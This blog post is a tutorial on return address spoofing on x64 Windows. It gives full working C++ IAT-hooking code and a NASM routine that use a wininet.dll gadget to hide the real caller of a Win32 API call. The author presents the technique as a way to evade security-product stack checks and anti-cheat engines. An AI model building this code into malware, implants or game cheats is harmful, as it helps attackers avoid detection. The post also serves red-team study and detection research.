# https://sabotagesec.com/the-stack-series-return-address-spoofing-on-x64/

[Skip to content](https://sabotagesec.com/the-stack-series-return-address-spoofing-on-x64/#wp--skip-link--target)

## The Stack Series: Return Address Spoofing on x64

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/image-4.png?w=1024\%22)

## **introduction**

The stack of a process has the potential to give away the true nature of the running program in the memory. Hence it is one of the monitored entities by the security solutions. When a program executes any interesting functions like InternetConnectA, security systems may initiate a stack check to find out if there is anything suspicious about the program. For example _Is the base module that initiated the entire call stack a floating code in the memory?_ If yes then its highly likely to be suspicious/malicious and requires further inspection.

This is usually done by performing a stack walk. In x86 applications, debuggers usually use EBP call chain to figure out call stack meanwhile x64 architecture system prefers to do it in a completely different manner by using unwind information stored in executable itself . In this article we will begin with a more simpler concept called Return Address Spoofing vector. This can be seen implemented in many game cheats and malwares. In the context of game development, modern games have robust anti-cheat engines in them to prevent external programs from modifying its code in memory to cheat the game. The anti-cheat in the game makes sure any function code executed in the game lies within the bounds of the game\\’s code in the memory. This is done by checking the return address of the function, if the return address lies within the boundaries of game code then anti-cheat engine assumes it is legit code and lets the function run. The return address spoofing fools the game into believing that the called function code is part of the game.

In the context of malwares, we usually see C2 platforms and malwares in the wild spoofing the return address to decouple the malware program from the called Win32 API in the event of a stack check initiated by security solution to identify the caller, by placing a return address that points to some legit DLL module to make it look like the Win32 API is called from that DLL instead of malware code. This doesn\\’t guarantee full evasion as it is one of many tricks employed by malwares to stay under the radar.

Give credits where its due:

- IAT hooking code from [iredteam](https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking/%22).
- x64 stack spoofer assembly from [namazso](https://sabotagesec.com/%22https://twitter.com/namazso/%22)
- Implemented in [Ace](https://github.com/kyleavery/AceLdr/%22) Loader project.

## **call stack**

Below image shows a simple call stack for InternetConnectA() function call. Following observations can be made from it.

- The main() function calls SomeFunc1 from some.dll.
- The SomeFunc2 in some.dll is invoked by SomeFunc1.
- Finally SomeFunc2 calls InternetConnectA() in wininet.dll.

The execution starts from the main and finally calls InternetConnectA api, this contextual information can be retrieved by any application by performing a \\”stack walk\\” which is a process of backtracking each frames from the recent function frame to the least recent one, giving us an overview of call chain of the program. In this post we are more concerned with return address spoofing that spoofing entire stack itself, that will be a topic for next post. 🙂

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/up-14.png?w=1024\%22)

The understanding of call stack is very important to implement a return address spoofer. Despite of the architecture \[x64/x86\], when program encounters a CALL instruction, the return address will be placed on the stack and the callee\\’s stack frame starts from next 8 bytes. This post covers x64 architecture, below image shows a spoofed return address highlighted in red color, this makes kernel32.dll look like the caller of InternetConnectA(). When any application looks at the return address of the InternetConnectA() sees only kernel32.dll, nothing sus!

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/up-15.png?w=1024\%22)

## **game plan**

- MessageBox() will be our target function whose return address will be spoofed.
- To make the spoofing happen, we need set few things up before MessageBox is executed. For that reason we will hook it.
- The hook is a simple Import Address Table hook, where the actual address to MessageBox() is replaced with our code.
- After hook is placed, we will finally call MessageBox().
- The call to MessageBox lands in our hooked code, where we implement a function SpoofRetAddr to call an assembly procedure that performs the return address spoofing.

## **iat hooking**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49 | `using``PrototypeMessageBox =``int``(WINAPI*)(``HWND``hWnd,``LPCSTR``lpText,``LPCSTR``lpCaption,``UINT``uType);`<br>`PrototypeMessageBox originalMsgBox = MessageBoxA;`<br>`PVOID``SpoofRetAddr(``PVOID``function,``HANDLE``module,``ULONG``size,``PVOID``a,``PVOID``b,``PVOID``c,``PVOID``d,``PVOID``e,``PVOID``f,``PVOID``g,``PVOID``h)`<br>`{`<br>```//will be discussed later`<br>`}`<br>`int``main()`<br>`{`<br>``<br>```LPVOID``imageBase = GetModuleHandleA(NULL);`<br>```PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;`<br>```PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((``DWORD_PTR``)imageBase + dosHeaders->e_lfanew);`<br>```PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;`<br>```IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];`<br>```importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (``DWORD_PTR``)imageBase);`<br>```LPCSTR``libraryName = NULL;`<br>```HMODULE``library = NULL;`<br>```PIMAGE_IMPORT_BY_NAME functionName = NULL;`<br>```while``(importDescriptor->Name != NULL)`<br>```{`<br>```libraryName = (``LPCSTR``)importDescriptor->Name + (``DWORD_PTR``)imageBase;`<br>```library = LoadLibraryA(libraryName);`<br>```if``(library)`<br>```{`<br>```PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;`<br>```originalFirstThunk = (PIMAGE_THUNK_DATA)((``DWORD_PTR``)imageBase + importDescriptor->OriginalFirstThunk);`<br>```firstThunk = (PIMAGE_THUNK_DATA)((``DWORD_PTR``)imageBase + importDescriptor->FirstThunk);`<br>```while``(originalFirstThunk->u1.AddressOfData != NULL)`<br>```{`<br>```functionName = (PIMAGE_IMPORT_BY_NAME)((``DWORD_PTR``)imageBase + originalFirstThunk->u1.AddressOfData);`<br>```// find MessageBoxA address`<br>```if``(std::string(functionName->Name).compare(\"MessageBoxA\") == 0)`<br>```{`<br>```SIZE_T``bytesWritten = 0;`<br>```DWORD``oldProtect = 0;`<br>```VirtualProtect((``LPVOID``)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);`<br>```// swap MessageBoxA address with address of hookedMessageBox`<br>```firstThunk->u1.Function = (``DWORD_PTR``)hookedMessageBox;`<br>```}`<br>```++originalFirstThunk;`<br>```++firstThunk;`<br>```}`<br>```}`<br>```importDescriptor++;`<br>```}`<br>```// message box after IAT hooking`<br>```MessageBoxA(NULL, \"Check_My_Ret_Addr\", \"Hooked\", 0);`<br>```return``0;`<br>`}` |

- Above code simply parses the executable PE.
- Import descriptor of each imported modules are parsed to locate the MessageBox api\\’s import address. We replace the original address with that of SpoofRetAddr function.
- Note: Before hooking, the original address of MessageBox needs to stored somewhere, in our program it is in originalMsgBoxA.

## **return address** **spoofing**

## **x64 stack primer**

- On x86 architecture, RBP register is a special purpose register that is used to keep track of stack frames and RSP is used as the stack pointer \[top of the stack\]. By following the pointer chains from RBP, we can process the entire call stack of the program. Scene is different on x64 architecture where RBP is a general purpose register and it is relieved off the stack duties. The RSP acts as both stack pointer and frame pointer.
- x64 architecture adopts fast call convention where first four parameters of the function are stored in RCX/RDX/R8/R9 respectively and rest are pushed on to stack. The direction of argument value parsing at the callsite is from left to right.
- RSP is fixed through out a function code in x64 architecture. The push and pop instructions are restricted to only prologue and epilogue of the function, these instructions cannot be used anywhere else in the code as it changes the state of RSP. Both local variables and argument values are retrieved by using RSP.
- There is special \\”Home space\\” allocated on the stack to accommodate the argument values. The address of Arguments passed through registers are stored in the home space. \[This is not the complete picture, refer references to know more\].
- The callee\\’s stack frame will have a reserved space to store the non-volatile registers on stack.
- When a call happens the caller pushes the return address, which is the address of the instruction that follows the call, to the stack and jumps to the target function code.
- The stack should be 16 byte aligned. \[Refer reference to know more\]

Below image is taken from [msdn](https://sabotagesec.com/%22https://learn.microsoft.com/en-us/cpp/build/stack-usage?source=recommendations&view=msvc-170\%22). it summarizes everything we have discussed before and shows the stack layout on x64 platform.

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/image.png?w=450\%22)

Below image shows the implementation of \\”SpoofRetAddr\\” which gets called from the hooked MessageBox function. Lets focus on first three parameters :

- _**PVOID function**_ : The target Win32 API whose return address needs to be spoofed before invocation.
- _**HANDLE module**_: The fake return address will be taken from this module. The gadget will be taken from this module. When target function returns to spoofed address, our gadget will get executed hence controlling the execution flow back to our assembly code, the fix up code to be specific. We will cover it in following sections.
- **_ULONG size_**: The size of the module.

The remaining parameters are for the target function.

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/image-3.png?w=1024\%22)

- The FindGadget function will fetch the address of the gadget from the _module_. The gadget we are interested in is \\” _**\\\xFF\\\x23**_\\” or **JMP QWORD PTR \[RBX\]**. In the program code, wininet.dll is the module and MessageBox is the function passed to the SpoofRetAddr function. So our call stack will show the address of the gadget in wininet.dll as the return address.
- The address of the gadget is stored in a pointer called Trampoline as shown in the code.
- The PRM structure glues together all the data \[Trampoline,function and placeholder\] we need to perform the spoofing.

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/image-2.png?w=266\%22)

- The variable \\”param\\” is of type PRM which is initialized with values _**Trampoline**_ and _**function**_.
- Finally the call to assembly procedure Spoof is made by passing arguments required for the target Win32 API and &param. The NULL is passed to keep the stack 16 byte aligned.
- The position of &param is very important. It has to be right after the first four arguments.

## assembly magic

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22 | `[BITS 64]`<br>`DEFAULT REL`<br>`GLOBAL Spoof`<br>`[SECTION .text]`<br>`Spoof:`<br>```pop    r11               ;saves the``return``address in R11`<br>```add    rsp, 8            ;skips callee reserved space`<br>```mov    rax, [rsp + 24]   ;Dereference param [address of gadget]`<br>```mov    r10, [rax]        ;gadget address stored in r10`<br>```mov    [rsp], r10        ;replace RSP with gadget address[spoof]`<br>```mov    r10, [rax + 8]    ;store target function addr in r10`<br>```mov    [rax + 8], r11    ;put original ret addr in function member of param`<br>```mov    [rax + 16], rbx   ;save rbx in rbx member of param`<br>```lea    rbx, [fixup]      ;store fixup addr in rbx`<br>```mov    [rax], rbx        ;put fixup in Trampoline member of param`<br>```mov    rbx, rax          ;store updated param in rbx`<br>```jmp    r10               ;jumps to target function addr`<br>`fixup:`<br>```sub    rsp, 16           ;Reverts all the RSP modifications done in the beginning`<br>```mov    rcx, rbx          ;Restore our updated param from rbx`<br>```mov    rbx, [rcx + 16]   ;restores the rbx`<br>```jmp    QWORD [rcx + 8]   ;jumps to original``return``addr` |

Working of Spoof procedure is explained below:

- When the SpoofRetAddr function calls the Spoof(), the caller pushes the return address to the stack hence RSP contains the original return address which is required by Spoof to return safely back to our program without any issues. So we need to safely store it in a non-volatile register of our choosing. Hence _**pop r11**_ does the job.
- Since we are working with x64 application, as we discussed in the previous section, the stack has a Shadow space or Home space just above the return address, which is 32 bytes in size. We need to skip these callee reserved space to fetch our stack based parameter \\”param\\” structure. The instructions **_add rsp 8 / mov rax_**, **_\[rsp + 24\]_** does exacly that. We have address of first member in param structure which is _Trampoline_ that has our gadget. Now the RAX points to address where gadget is stored. From RAX, the gadget is moved to r10. The RAX will be used to reference the param struct.
- The spoofing happens at **_mov \[rsp\] , r10_** when the gadget address is stored in RSP. Now the return address is changed.
- The instruction \\”mov r10, \[rax + 8\]\\” stores the second member _function_ which is MessageBox api address in r10.
- The instruction **_mov \[rax + 8\], r11_** stores original return address in _function_ member of param struct. This will be used in fixup to return to the caller after the execution of MessageBox.
- The instruction **_lea rbx, \[fixup\]_** stores the address of fixup code in RBX for later use. The instruction **_mov \[rax\], rbx_** replaces the value of Trampoline member with fixup in RBX.
- The **_mov rbx, rax_** instruction stores updated param struct in RBX.
- And finally instruction **_jmp r10_** calls the MessageBox api.

How does the fixup code work?

- Since we have modified the return address to our gadget **_JMP QWORD PTR \[RBX\]_** in wininet.dll, when the MessageBox executes ret instruction, address to gadget get loaded in the RIP and resumes execution.
- RBX contains the updated param structure with function member pointing to original return address. The instruction _**mov rcx, rbx**_ in fixup stores the param in RCX.
- The instruction **_jmp QWORD \[rcx + 8\]_** will take us back to the caller SpoofRetAddr function.
- The instruction **_sub rsp, 16_** in fixup reverts all the changes made to RSP and cleans the stack.

The overall working of the Spoof procedure is highlighted in the image below.

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/up-17.png?w=1024\%22)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118 | `#include <iostream>`<br>`#include <Windows.h>`<br>`#include <winternl.h>`<br>`#include <psapi.h>`<br>`using``PrototypeMessageBox =``int``(WINAPI*)(``HWND``hWnd,``LPCSTR``lpText,``LPCSTR``lpCaption,``UINT``uType);`<br>`PrototypeMessageBox originalMsgBox = MessageBoxA;`<br>`extern``\"C\"``PVOID``Spoof(``PVOID``function,``HANDLE``module,``ULONG``size,``PVOID``a,``PVOID``b,``PVOID``c,``PVOID``d,``PVOID``e,``PVOID``f,``PVOID``g,``PVOID``h);`<br>`typedef``struct``{`<br>```const``void``* trampoline;``// always JMP RBX`<br>```void``* function;``// Target Function`<br>```void``* rbx;``// Placeholder`<br>`} PRM, * PPRM;`<br>`INT``compare(``PVOID``stringA,``PVOID``stringB,``SIZE_T``length)`<br>`{`<br>```PUCHAR``A = (``PUCHAR``)stringA;`<br>```PUCHAR``B = (``PUCHAR``)stringB;`<br>```do``{`<br>```if``(*A++ != *B++)`<br>```{`<br>```return``(*--A - *--B);`<br>```};`<br>```}``while``(--length != 0);`<br>```return``0;`<br>`}`<br>`PVOID``FindGadget(``LPBYTE``module,``ULONG``size)`<br>`{`<br>```for``(``int``x = 0; x < size; x++)`<br>```{`<br>```if``(compare(module + x, (``PVOID``)\"\\xFF\\x23\", 2) == 0)`<br>```{`<br>```return``(``LPVOID``)(module + x);`<br>```};`<br>```};`<br>```return``NULL;`<br>`}`<br>`PVOID``SpoofRetAddr(``PVOID``function,``HANDLE``module,``ULONG``size,``PVOID``a,``PVOID``b,``PVOID``c,``PVOID``d,``PVOID``e,``PVOID``f,``PVOID``g,``PVOID``h)`<br>`{`<br>```PVOID``Trampoline;`<br>```if``(function != NULL)`<br>```{`<br>```Trampoline = FindGadget((``LPBYTE``)module, size);`<br>```if``(Trampoline != NULL)`<br>```{`<br>```PRM param = { Trampoline, function };`<br>```return``(`<br>```(`<br>```PVOID``(*) (`<br>```PVOID``,``PVOID``,``PVOID``,``PVOID``, PPRM,``PVOID``,``PVOID``,``PVOID``,``PVOID``,``PVOID`<br>```)`<br>```)`<br>```(`<br>```(``PVOID``)Spoof`<br>```)`<br>```)`<br>```(`<br>```a, b, c, d, &param, NULL,e,f,g,h`<br>```);`<br>``<br>```};`<br>```};`<br>```return``NULL;`<br>`}`<br>`int``hookedMessageBox(``HWND``hWnd,``LPCSTR``lpText,``LPCSTR``lpCaption,``UINT``uType)`<br>`{`<br>```HMODULE``hModule = LoadLibrary(L\"Wininet.dll\");`<br>```MODULEINFO modInfo;`<br>```GetModuleInformation(GetCurrentProcess(), hModule, &modInfo,``sizeof``(modInfo));`<br>```ULONG``ModuleSize = modInfo.SizeOfImage;`<br>```PVOID``msgBox = originalMsgBox;`<br>```;`<br>```SpoofRetAddr(msgBox, hModule, ModuleSize, hWnd, (``PVOID``)lpText, (``PVOID``)lpCaption, (``PVOID``)uType,NULL,NULL,NULL,NULL);`<br>```//SPOOF(msgBox,hModule,ModuleSize,hWnd,lpText,lpCaption,uType);`<br>```return``0;`<br>``<br>`}`<br>`int``main()`<br>`{`<br>``<br>```LPVOID``imageBase = GetModuleHandleA(NULL);`<br>```PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;`<br>```PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((``DWORD_PTR``)imageBase + dosHeaders->e_lfanew);`<br>```PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;`<br>```IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];`<br>```importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (``DWORD_PTR``)imageBase);`<br>```LPCSTR``libraryName = NULL;`<br>```HMODULE``library = NULL;`<br>```PIMAGE_IMPORT_BY_NAME functionName = NULL;`<br>```while``(importDescriptor->Name != NULL)`<br>```{`<br>```libraryName = (``LPCSTR``)importDescriptor->Name + (``DWORD_PTR``)imageBase;`<br>```library = LoadLibraryA(libraryName);`<br>```if``(library)`<br>```{`<br>```PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;`<br>```originalFirstThunk = (PIMAGE_THUNK_DATA)((``DWORD_PTR``)imageBase + importDescriptor->OriginalFirstThunk);`<br>```firstThunk = (PIMAGE_THUNK_DATA)((``DWORD_PTR``)imageBase + importDescriptor->FirstThunk);`<br>```while``(originalFirstThunk->u1.AddressOfData != NULL)`<br>```{`<br>```functionName = (PIMAGE_IMPORT_BY_NAME)((``DWORD_PTR``)imageBase + originalFirstThunk->u1.AddressOfData);`<br>```// find MessageBoxA address`<br>```if``(std::string(functionName->Name).compare(\"MessageBoxA\") == 0)`<br>```{`<br>```SIZE_T``bytesWritten = 0;`<br>```DWORD``oldProtect = 0;`<br>```VirtualProtect((``LPVOID``)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);`<br>```// swap MessageBoxA address with address of hookedMessageBox`<br>```firstThunk->u1.Function = (``DWORD_PTR``)hookedMessageBox;`<br>```}`<br>```++originalFirstThunk;`<br>```++firstThunk;`<br>```}`<br>```}`<br>```importDescriptor++;`<br>```}`<br>```// message box after IAT hooking`<br>```MessageBoxA(NULL, \"Check_My_Ret_Addr\", \"Hooked\", 0);`<br>```return``0;`<br>`}` |

## Result

![\"\"](https://sabotagesec.com/wp-content/uploads/2022/12/image-5.png?w=978\%22)

[Offensive Coding](https://sabotagesec.com/category/offensive-coding/)

[beacon](https://sabotagesec.com/tag/beacon/), [C#](https://sabotagesec.com/tag/c/), [Malware](https://sabotagesec.com/tag/malware/), [redteam](https://sabotagesec.com/tag/redteam/), [return address](https://sabotagesec.com/tag/return-address/), [return address spoofing](https://sabotagesec.com/tag/return-address-spoofing/), [spoofing](https://sabotagesec.com/tag/spoofing/), [stack](https://sabotagesec.com/tag/stack/), [x64](https://sabotagesec.com/tag/x64/)

### Leave a Reply [Cancel reply](https://sabotagesec.com/the-stack-series-return-address-spoofing-on-x64/\#respond)

Your email address will not be published.Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Save my name, email, and website in this browser for the next time I comment.